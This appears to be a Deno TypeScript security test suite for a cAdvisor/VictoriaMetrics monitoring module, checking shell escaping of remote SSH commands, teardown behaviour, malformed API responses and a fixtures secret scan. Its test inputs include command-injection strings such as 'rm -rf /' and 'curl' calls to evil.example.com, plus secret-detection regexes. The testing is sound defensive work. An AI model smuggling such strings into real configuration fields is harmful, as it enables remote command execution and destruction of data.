/**
 * Adversarial suite: separates the TWO interpolation sites in cadvisor.ts's
 * SSH boundary (the safe destination argv element vs. the remote-command
 * string sent to the REMOTE shell), pins remove()'s unconditional/
 * non-idempotent teardown, hostile/malformed HTTP response handling for both
 * the cAdvisor and VictoriaMetrics APIs, and a mechanical fixtures-secret-scan
 * over cadvisor/fixtures/* (both JSON and text).
 *
 * Site 2 (vmComposeDir / vmScrapeConfig / vmComposeFile) is now hardened via
 * the workspace-canonical `shellEsc` helper — bug #1 (HIGH, remote-shell
 * command injection) in `cadvisor-latent-bugs` is CLOSED as of 2026.08.01.1.
 * The four tests below are re-baselined to assert the single-quote-wrapped,
 * safely-escaped command strings instead of the previously-unescaped ones.
 *
 * As of 2026.08.02.1, all cadvisor-latent-bugs tracked in the LOCAL
 * `cadvisor-latent-bugs` issue-lifecycle model are fixed (fragile `sed`
 * range-delete, unnormalized cpuPercent, empty-aliases name collapse,
 * unclamped counter-reset deltas, README typeVersion drift, hardcoded VM
 * port); the pins below now assert the FIXED behavior.
 */
import { assert, assertEquals, assertRejects } from "jsr:@std/assert@1";
import { model, removeCadvisorJob } from "./cadvisor.ts";
import dockerFixture from "../../fixtures/cadvisor-docker.json" with {
  type: "json",
};
import vmRangeFixture from "../../fixtures/vm-query-range.json" with {
  type: "json",
};

const FIXTURES_DIR = new URL("../../fixtures/", import.meta.url);
async function readFixtureText(name: string): Promise<string> {
  return await Deno.readTextFile(new URL(name, FIXTURES_DIR));
}
const SCRAPE_CONFIG_BEFORE = await readFixtureText("scrape-config-before.txt");
const SCRAPE_CONFIG_AFTER = await readFixtureText("scrape-config-after.txt");

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

const GLOBAL_ARGS = {
  host: "host.example.com",
  username: "root",
  cadvisorPort: 8080,
  vmComposeDir: "/opt/victoriametrics",
  vmComposeFile: "compose-vl-single.yml",
  vmScrapeConfig: "prometheus-vl-single.yml",
  vmPort: 8428,
};

type Written = { spec: string; name: string; payload: Record<string, unknown> };

function makeCtx(globalArgs: Record<string, unknown> = GLOBAL_ARGS) {
  const written: Written[] = [];
  return {
    written,
    ctx: {
      globalArgs,
      writeResource: (spec: string, name: string, payload: unknown) => {
        written.push({
          spec,
          name,
          payload: payload as Record<string, unknown>,
        });
        return Promise.resolve({ spec, name });
      },
      logger: { info: () => {}, warning: () => {} },
    },
  };
}

type MethodMap = Record<string, {
  arguments: { parse: (a: unknown) => unknown };
  execute: (a: unknown, c: unknown) => Promise<unknown>;
}>;

function run(name: string, args: Record<string, unknown>, ctx: unknown) {
  const method = (model.methods as MethodMap)[name];
  return method.execute(method.arguments.parse(args), ctx);
}

type CommandEnvelope = { success: boolean; stdout: string; stderr: string };
type CommandRecording = { cmd: string; args: string[] };

function withCommandStub(
  handler: (
    call: CommandRecording,
    callIndex: number,
  ) => CommandEnvelope | Promise<CommandEnvelope>,
  fn: (calls: CommandRecording[]) => Promise<unknown>,
) {
  const denoRecord = Deno as unknown as Record<string, unknown>;
  const original = denoRecord.Command;
  const calls: CommandRecording[] = [];
  let index = 0;
  class FakeCommand {
    #recording: CommandRecording;
    constructor(cmd: string, options: { args?: string[] }) {
      this.#recording = { cmd, args: options.args ?? [] };
    }
    output(): Promise<
      { success: boolean; stdout: Uint8Array; stderr: Uint8Array }
    > {
      calls.push(this.#recording);
      const i = index++;
      return Promise.resolve(handler(this.#recording, i)).then((r) => ({
        success: r.success,
        stdout: new TextEncoder().encode(r.stdout),
        stderr: new TextEncoder().encode(r.stderr),
      }));
    }
  }
  denoRecord.Command = FakeCommand;
  return fn(calls).finally(() => {
    denoRecord.Command = original;
  });
}

const OK = (stdout = ""): CommandEnvelope => ({
  success: true,
  stdout,
  stderr: "",
});

function sshCommandOf(call: CommandRecording): string {
  return call.args[call.args.length - 1];
}

type Route = (req: Request) => Response | Promise<Response> | undefined;

async function withFetchStub(
  routes: Route[],
  fn: (calls: Request[]) => Promise<void>,
) {
  const original = globalThis.fetch;
  const calls: Request[] = [];
  globalThis.fetch = (async (
    input: Request | URL | string,
    init?: RequestInit,
  ) => {
    const req = input instanceof Request ? input : new Request(input, init);
    calls.push(req.clone());
    for (const route of routes) {
      const res = await route(req);
      if (res) return res;
    }
    throw new Error(`fetch stub: unrouted request ${req.method} ${req.url}`);
  }) as typeof globalThis.fetch;
  try {
    await fn(calls);
  } finally {
    globalThis.fetch = original;
  }
}

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function withOneResponse(
  body: unknown,
  status: number,
  fn: (calls: Request[]) => Promise<void>,
) {
  return withFetchStub([() => json(body, status)], fn);
}

function withSyncSetTimeout(fn: () => Promise<unknown>) {
  const globalRecord = globalThis as unknown as Record<string, unknown>;
  const original = globalRecord.setTimeout;
  globalRecord.setTimeout = (
    (cb: (...a: unknown[]) => void, _ms?: number, ...args: unknown[]) => {
      cb(...args);
      return 0 as unknown as number;
    }
  ) as unknown as typeof globalThis.setTimeout;
  return fn().finally(() => {
    globalRecord.setTimeout = original;
  });
}

// ---------------------------------------------------------------------------
// Site 1 (SAFE): the ssh-destination argv element `${username}@${host}` is
// ONE local argv element — Deno.Command has no local shell, so ssh consumes
// it as a destination, not a shell-interpreted string.
// ---------------------------------------------------------------------------

Deno.test("SAFE: a hostile host value lands as exactly ONE local argv element (ssh destination) — not local-shell-interpretable", async () => {
  const hostileHost = "host.example.com; rm -rf / #";
  const { ctx } = makeCtx({ ...GLOBAL_ARGS, host: hostileHost });
  await withCommandStub(
    () => OK("not found"),
    async (calls) => {
      await run("status", {}, ctx);
      const destArg = calls[0].args.find((a) => a.includes("@"));
      assertEquals(
        destArg,
        `root@${hostileHost}`,
        "the hostile host is embedded in exactly one argv element, never split",
      );
      assertEquals(
        calls[0].args.filter((a) => a === "rm").length,
        0,
        "no argv element is literally 'rm' — nothing was shell-split",
      );
    },
  );
});

Deno.test("SAFE: a hostile username value is likewise confined to the single destination argv element", async () => {
  const hostileUsername = "root && curl evil.example.com/x #";
  const { ctx } = makeCtx({ ...GLOBAL_ARGS, username: hostileUsername });
  await withCommandStub(
    () => OK("not found"),
    async (calls) => {
      await run("status", {}, ctx);
      assert(
        calls[0].args.includes(`${hostileUsername}@host.example.com`),
        "hostile username is one exact argv element",
      );
    },
  );
});

// ---------------------------------------------------------------------------
// Site 2 (HARDENED): vmComposeDir / vmScrapeConfig / vmComposeFile are now
// escaped via shellEsc before being interpolated into the COMMAND STRING that
// ssh hands to the REMOTE shell — closing the HIGH remote-shell
// command-injection gap (bug #1 in cadvisor-latent-bugs, defense-in-depth
// against a hostile-admin or misconfiguration vector).
// ---------------------------------------------------------------------------

Deno.test("hardened: a hostile vmScrapeConfig value is single-quote-escaped via shellEsc before landing in the `cat` command string sent to the REMOTE shell (status)", async () => {
  const hostileScrapeConfig =
    "config.yml; curl http://evil.example.com/pwned #";
  const { ctx } = makeCtx({
    ...GLOBAL_ARGS,
    vmScrapeConfig: hostileScrapeConfig,
  });
  await withCommandStub(
    (call) => {
      const cmd = sshCommandOf(call);
      if (cmd.startsWith("docker inspect")) return OK("not found");
      return OK("");
    },
    async (calls) => {
      await run("status", {}, ctx);
      const catCall = calls.find((c) => sshCommandOf(c).startsWith("cat "))!;
      assertEquals(
        sshCommandOf(catCall),
        `cat '/opt/victoriametrics/${hostileScrapeConfig}'`,
        "the hostile config filename is single-quote-wrapped by shellEsc in the remote command string — " +
          "a real ssh session hands this to the remote /bin/sh as ONE inert argument, never executing the curl",
      );
    },
  );
});

Deno.test("hardened: a hostile vmComposeDir value is single-quote-escaped via shellEsc in deploy's `cd ... && docker compose` command string", async () => {
  const hostileComposeDir = "/opt/vm && curl http://evil.example.com/pwned #";
  const { ctx } = makeCtx({ ...GLOBAL_ARGS, vmComposeDir: hostileComposeDir });
  await withSyncSetTimeout(() =>
    withCommandStub(
      (call, i) => {
        const cmd = sshCommandOf(call);
        if (i === 0) return { success: false, stdout: "", stderr: "not found" };
        if (cmd.startsWith("docker run")) return OK();
        // The heredoc-append command also starts with "cat " (`cat >> ...`),
        // so the specific checks must come before the plain-read `cat` one.
        if (cmd.includes("<< 'HEREDOC'")) return OK();
        if (cmd.includes("docker compose")) return OK();
        if (cmd.startsWith("cat ")) return OK(SCRAPE_CONFIG_BEFORE);
        if (cmd.startsWith("docker inspect")) return OK("running\n");
        return OK("");
      },
      async (calls) => {
        await run("deploy", {}, ctx);
        const composeCall = calls.find((c) =>
          sshCommandOf(c).includes("docker compose")
        )!;
        assertEquals(
          sshCommandOf(composeCall),
          `cd '${hostileComposeDir}' && docker compose -f 'compose-vl-single.yml' restart victoriametrics`,
          "the hostile compose dir is single-quote-wrapped before the '&&' — the injected " +
            "curl is now inert data inside the quotes, never executed by the remote shell",
        );
      },
    )
  );
});

Deno.test("hardened: a hostile vmComposeFile value is single-quote-escaped via shellEsc in the `-f <file>` flag of the remote docker compose command", async () => {
  const hostileComposeFile =
    "compose.yml; curl http://evil.example.com/pwned #";
  const { ctx } = makeCtx({
    ...GLOBAL_ARGS,
    vmComposeFile: hostileComposeFile,
  });
  await withCommandStub(
    () => OK(),
    async (calls) => {
      await run("remove", {}, ctx);
      const restartCall = calls.find((c) =>
        sshCommandOf(c).includes("docker compose")
      )!;
      assertEquals(
        sshCommandOf(restartCall),
        `cd '/opt/victoriametrics' && docker compose -f '${hostileComposeFile}' restart victoriametrics`,
        "the hostile compose-file value is single-quote-wrapped, never embedded verbatim, in the remote command",
      );
    },
  );
});

Deno.test("hardened: contrast — the SAME hostile string used as vmComposeDir (remote command, now shellEsc-quoted) vs. as host (ssh destination, argv-confined) demonstrates the two sites use different-but-now-both-safe mechanisms", async () => {
  const hostile = "x; touch /tmp/pwned #";

  // As vmComposeDir: now single-quote-escaped inside the remote command string.
  // remove()'s VM-restart call is now at index 3 (LB2's job-scoped teardown
  // rewrite inserted a read [1] and a rewrite [2] ahead of it).
  const { ctx: ctx1 } = makeCtx({ ...GLOBAL_ARGS, vmComposeDir: hostile });
  await withCommandStub(
    () => OK(),
    async (calls) => {
      await run("remove", {}, ctx1);
      const cmd = sshCommandOf(calls[3]);
      assert(
        cmd.startsWith(`cd '${hostile}' &&`),
        "escaped via shellEsc inside the command string",
      );
    },
  );

  // As host: lands as one argv element consumed by ssh as a destination.
  const { ctx: ctx2 } = makeCtx({ ...GLOBAL_ARGS, host: hostile });
  await withCommandStub(
    () => OK(),
    async (calls) => {
      await run("remove", {}, ctx2);
      assert(
        calls[0].args.includes(`root@${hostile}`),
        "confined to one argv element, not embedded in any command string",
      );
      assert(
        !sshCommandOf(calls[0]).includes(hostile),
        "the hostile string never appears inside the COMMAND positional itself",
      );
    },
  );
});

// ---------------------------------------------------------------------------
// remove(): unconditional, non-idempotent teardown — no existence check
// ---------------------------------------------------------------------------

Deno.test("pin: remove() issues the SAME four commands unconditionally on every call — no 'already removed' short-circuit", async () => {
  const { ctx } = makeCtx();
  await withCommandStub(
    () => OK(""),
    async (calls) => {
      await run("remove", {}, ctx);
      await run("remove", {}, ctx);
      assertEquals(
        calls.length,
        8,
        "two full 4-call teardown sequences — no dedup",
      );
      assertEquals(sshCommandOf(calls[0]), sshCommandOf(calls[4]));
      assertEquals(sshCommandOf(calls[1]), sshCommandOf(calls[5]));
      assertEquals(sshCommandOf(calls[2]), sshCommandOf(calls[6]));
      assertEquals(sshCommandOf(calls[3]), sshCommandOf(calls[7]));
    },
  );
});

// ---------------------------------------------------------------------------
// LB2 job-scoping: remove()'s job-scoped rewrite must remove ONLY the exact
// `- job_name: cadvisor` block — not a differently named job that merely
// contains the substring "cadvisor", nor an unrelated job that happens to
// share cadvisor's port. The old sed range-delete (keyed on the `cadvisor`
// SUBSTRING and an unanchored `- .*:8080` port pattern) would have clobbered
// both. Synthetic fixture only — see fixtures/PROVENANCE.md's capture ban.
// ---------------------------------------------------------------------------

const JOB_SCOPING_BEFORE = [
  "global:",
  "  scrape_interval: 30s",
  "",
  "scrape_configs:",
  "  - job_name: victoriametrics",
  "    static_configs:",
  "      - targets:",
  "          - localhost:8428",
  "",
  "  - job_name: cadvisor",
  "    scrape_interval: 30s",
  "    static_configs:",
  "      - targets:",
  "          - host.example.com:8080",
  "",
  "  - job_name: other-svc",
  "    static_configs:",
  "      - targets:",
  "          - host.example.com:8080",
  "",
  "  - job_name: my-cadvisor-exporter",
  "    static_configs:",
  "      - targets:",
  "          - host.example.com:9999",
].join("\n") + "\n";

Deno.test("pin: removeCadvisorJob removes ONLY the exact cadvisor job — a sibling job sharing its port (:8080) and a job whose name merely CONTAINS the substring 'cadvisor' both survive intact", () => {
  const result = removeCadvisorJob(JOB_SCOPING_BEFORE);

  assert(
    !result.includes("job_name: cadvisor\n"),
    "the exact cadvisor job_name line must be gone",
  );
  assert(
    result.includes("job_name: other-svc"),
    "the unrelated same-port job must survive — the old sed's `- .*:8080` " +
      "range pattern had no job anchoring and would have deleted this too",
  );
  assert(
    result.includes("job_name: my-cadvisor-exporter"),
    "a job whose name merely CONTAINS the substring 'cadvisor' must survive " +
      "— the old sed's `/cadvisor/d` line-delete had no job-boundary anchoring",
  );
  const portOccurrences = result.split(":8080").length - 1;
  assertEquals(
    portOccurrences,
    1,
    "only other-svc's :8080 target remains — cadvisor's own :8080 target line is gone",
  );

  // Idempotent: re-filtering the already-filtered config is a no-op, since no
  // exact `job_name: cadvisor` line remains.
  assertEquals(removeCadvisorJob(result), result);
});

Deno.test("unit: removeCadvisorJob(scrape-config-after.txt) === scrape-config-before.txt (byte-exact round trip against the committed fixtures)", () => {
  assertEquals(removeCadvisorJob(SCRAPE_CONFIG_AFTER), SCRAPE_CONFIG_BEFORE);
});

// ---------------------------------------------------------------------------
// Hostile / malformed HTTP responses — cAdvisor boundary
// ---------------------------------------------------------------------------

Deno.test("pin: a non-JSON cAdvisor response body surfaces as an unmapped SyntaxError", async () => {
  const { ctx } = makeCtx();
  await withFetchStub(
    [() =>
      new Response("<html>502 Bad Gateway</html>", {
        status: 200,
        headers: { "Content-Type": "text/html" },
      })],
    async () => {
      await assertRejects(() => run("current-metrics", {}, ctx), SyntaxError);
    },
  );
});

Deno.test("pin: a non-JSON VictoriaMetrics response body surfaces as an unmapped SyntaxError", async () => {
  const { ctx } = makeCtx();
  await withFetchStub(
    [() =>
      new Response("not json at all", {
        status: 200,
        headers: { "Content-Type": "text/plain" },
      })],
    async () => {
      await assertRejects(() => run("top-memory", {}, ctx), SyntaxError);
    },
  );
});

Deno.test("pin: a single-stat container (no previous sample) yields cpuPercent/networkRxMBps/networkTxMBps of exactly 0 — the rate math is skipped entirely, not merely small", async () => {
  const { ctx, written } = makeCtx();
  const hostile = {
    "/docker/onlyonestat": {
      aliases: ["single-sample"],
      spec: { memory: { limit: 104857600 } },
      stats: [{
        timestamp: "2026-07-01T12:00:00Z",
        memory: { usage: 52428800 },
        cpu: { usage: { total: 999999999999 } },
        network: { rx_bytes: 999999999, tx_bytes: 999999999 },
      }],
    },
  };
  await withOneResponse(hostile, 200, async () => {
    await run("current-metrics", {}, ctx);
  });
  const res = written.find((w) => w.spec === "current")!;
  const c = (res.payload.containers as Array<Record<string, unknown>>)[0];
  assertEquals(c.cpuPercent, 0);
  assertEquals(c.networkRxMBps, 0);
  assertEquals(c.networkTxMBps, 0);
});

Deno.test("pin: a counter-reset (current sample LOWER than the previous one) produces cpuPercent/networkRxMBps/networkTxMBps of exactly 0 — clamped to 0, never negative", async () => {
  // Fixed (bug #5 in cadvisor-latent-bugs): current-metrics computes
  // `latest - prev` deltas clamped via Math.max(0, ...). A container restart
  // or counter wraparound on the real cAdvisor side would otherwise make
  // `latest` smaller than `prev`, reporting a nonsensical negative rate.
  const { ctx, written } = makeCtx();
  const hostile = {
    "/docker/counterreset": {
      aliases: ["restarted-container"],
      spec: { memory: { limit: 104857600 } },
      stats: [
        {
          timestamp: "2026-07-01T12:00:00Z",
          memory: { usage: 52428800 },
          cpu: { usage: { total: 100000000000 } },
          network: { rx_bytes: 10485760, tx_bytes: 5242880 },
        },
        {
          timestamp: "2026-07-01T12:00:30Z",
          memory: { usage: 10485760 },
          cpu: { usage: { total: 10000000000 } }, // LOWER than prev — counter reset
          network: { rx_bytes: 1048576, tx_bytes: 524288 }, // LOWER than prev
        },
      ],
    },
  };
  await withOneResponse(hostile, 200, async () => {
    await run("current-metrics", {}, ctx);
  });
  const res = written.find((w) => w.spec === "current")!;
  const c = (res.payload.containers as Array<Record<string, unknown>>)[0];
  assertEquals(c.cpuPercent, 0, "clamped to 0, not negative");
  assertEquals(c.networkRxMBps, 0, "clamped to 0, not negative");
  assertEquals(c.networkTxMBps, 0, "clamped to 0, not negative");
});

Deno.test("pin: memLimit boundary — exactly 1e18 fails the '< 1e18' guard (treated as no-limit, MB=0), but a value clearly under it passes", async () => {
  // NOTE: `1e18 - 1` is NOT distinguishable from `1e18` as an IEEE-754 double
  // (1e18 exceeds Number.MAX_SAFE_INTEGER, so the ULP near this magnitude is
  // ~128) — using it here would make both fixtures identical floats. Use a
  // value far enough below 1e18 (999000000000000000, i.e. 1e18 - 1e15) to be
  // unambiguously representable and distinct.
  const { ctx, written } = makeCtx();
  const hostile = {
    "/docker/atboundary": {
      aliases: ["at-1e18"],
      spec: { memory: { limit: 1e18 } },
      stats: [{
        timestamp: "2026-07-01T12:00:00Z",
        memory: { usage: 1048576 },
        cpu: { usage: { total: 1000000000 } },
        network: {},
      }],
    },
    "/docker/justunder": {
      aliases: ["just-under-1e18"],
      spec: { memory: { limit: 999000000000000000 } },
      stats: [{
        timestamp: "2026-07-01T12:00:00Z",
        memory: { usage: 1048576 },
        cpu: { usage: { total: 1000000000 } },
        network: {},
      }],
    },
  };
  await withOneResponse(hostile, 200, async () => {
    await run("current-metrics", {}, ctx);
  });
  const res = written.find((w) => w.spec === "current")!;
  const containers = res.payload.containers as Array<Record<string, unknown>>;
  const atBoundary = containers.find((c) => c.name === "at-1e18")!;
  const justUnder = containers.find((c) => c.name === "just-under-1e18")!;
  assertEquals(
    atBoundary.memoryLimitMB,
    0,
    "exactly 1e18 fails '< 1e18' — treated as no-limit",
  );
  assert(
    (justUnder.memoryLimitMB as number) > 0,
    "1e18-1 passes the guard and gets a (huge) computed MB value",
  );
});

Deno.test("pin: empty (but present) aliases array falls back to the cgroup path, NOT the literal string 'unknown'", async () => {
  // Fixed (bug #4 in cadvisor-latent-bugs):
  // `info.aliases?.[0] ?? path.split("/").pop() ?? "unknown"` falls back to
  // the path whenever aliases[0] is missing — whether aliases is ABSENT or
  // present-but-empty — instead of only when aliases is absent entirely.
  const { ctx, written } = makeCtx();
  const hostile = {
    "/docker/deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdead": {
      aliases: [],
      spec: { memory: { limit: 104857600 } },
      stats: [{
        timestamp: "2026-07-01T12:00:00Z",
        memory: { usage: 1048576 },
        cpu: { usage: { total: 1000000000 } },
        network: {},
      }],
    },
  };
  await withOneResponse(hostile, 200, async () => {
    await run("current-metrics", {}, ctx);
  });
  const res = written.find((w) => w.spec === "current")!;
  const c = (res.payload.containers as Array<Record<string, unknown>>)[0];
  assertEquals(
    c.name,
    "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdead",
  );
  assert(
    (c.name as string).includes("deadbeef"),
    "the cgroup path is used as the fallback name, not the literal 'unknown'",
  );
});

Deno.test("pin: top-memory — a metric with a MISSING name falls back to the literal string 'unknown'", async () => {
  const { ctx, written } = makeCtx();
  const hostile = {
    data: {
      result: [{
        metric: {},
        values: [[1751370000, "104857600"], [1751370300, "157286400"]],
      }],
    },
  };
  await withOneResponse(hostile, 200, async () => {
    await run("top-memory", {}, ctx);
  });
  const res = written.find((w) => w.spec === "topMemory")!;
  const containers = res.payload.containers as Array<Record<string, unknown>>;
  assertEquals(containers[0].name, "unknown");
});

Deno.test("pin: top-memory — sample values that are all zero (or negative-parsing) are filtered out by `.filter(v => v > 0)`, skipping the series entirely", async () => {
  const { ctx, written } = makeCtx();
  const hostile = {
    data: {
      result: [{
        metric: { name: "all-zero-series" },
        values: [[1751370000, "0"], [1751370300, "0"]],
      }],
    },
  };
  await withOneResponse(hostile, 200, async () => {
    await run("top-memory", {}, ctx);
  });
  const res = written.find((w) => w.spec === "topMemory")!;
  assertEquals(res.payload.containers, []);
});

// ---------------------------------------------------------------------------
// Fixtures-secret-scan — mechanical backstop over the committed corpus
// (JSON leaf-string scan + text-line scan, since this fixture set mixes
// JSON wire-shape fixtures with plain-text scrape-config fixtures)
// ---------------------------------------------------------------------------

const SECRET_PATTERNS: Array<{ name: string; re: RegExp }> = [
  { name: "PEM block header", re: /-----BEGIN [A-Z ]+-----/ },
  {
    name: "JWT-shaped token",
    re: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/,
  },
  {
    name:
      "high-entropy token-shaped value (32+ contiguous alnum/base64url chars)",
    re: /^[A-Za-z0-9+/_=-]{32,}$/,
  },
];

function collectStrings(value: unknown, out: string[] = []): string[] {
  if (typeof value === "string") {
    out.push(value);
  } else if (Array.isArray(value)) {
    for (const v of value) collectStrings(v, out);
  } else if (value !== null && typeof value === "object") {
    for (const v of Object.values(value as Record<string, unknown>)) {
      collectStrings(v, out);
    }
  }
  return out;
}

const JSON_FIXTURES: Record<string, unknown> = {
  "cadvisor-docker.json": dockerFixture,
  "vm-query-range.json": vmRangeFixture,
};

Deno.test("fixtures-secret-scan: no committed JSON fixture leaf-string contains a secret-shaped value", () => {
  const violations: string[] = [];
  for (const [file, data] of Object.entries(JSON_FIXTURES)) {
    for (const str of collectStrings(data)) {
      for (const { name, re } of SECRET_PATTERNS) {
        if (re.test(str)) {
          violations.push(`${file}: value "${str}" matched ${name}`);
        }
      }
    }
  }
  assertEquals(
    violations,
    [],
    `secret-shaped content found:\n${violations.join("\n")}`,
  );
});

const TEXT_FIXTURES: Record<string, string> = {
  "scrape-config-before.txt": SCRAPE_CONFIG_BEFORE,
  "scrape-config-after.txt": SCRAPE_CONFIG_AFTER,
};

Deno.test("fixtures-secret-scan: no committed text-fixture LINE contains a secret-shaped substring", () => {
  const violations: string[] = [];
  for (const [file, text] of Object.entries(TEXT_FIXTURES)) {
    for (const line of text.split("\n")) {
      for (const { name, re } of SECRET_PATTERNS) {
        // Line-level scan uses an unanchored variant of the high-entropy rule
        // (text fixtures are multi-line blobs, not isolated JSON leaves).
        const unanchored = name.startsWith("high-entropy")
          ? /[A-Za-z0-9+/_=-]{32,}/
          : re;
        if (unanchored.test(line)) {
          violations.push(
            `${file}: line ${JSON.stringify(line)} matched ${name}`,
          );
        }
      }
    }
  }
  assertEquals(
    violations,
    [],
    `secret-shaped content found:\n${violations.join("\n")}`,
  );
});

Deno.test("fixtures-secret-scan: sanity — the scanner actually detects an injected secret shape", () => {
  const violations: string[] = [];
  const poisoned = { key: "a".repeat(40) };
  for (const str of collectStrings(poisoned)) {
    for (const { re } of SECRET_PATTERNS) {
      if (re.test(str)) violations.push(str);
    }
  }
  assert(
    violations.length > 0,
    "sanity check: scanner must flag a high-entropy shape",
  );
});
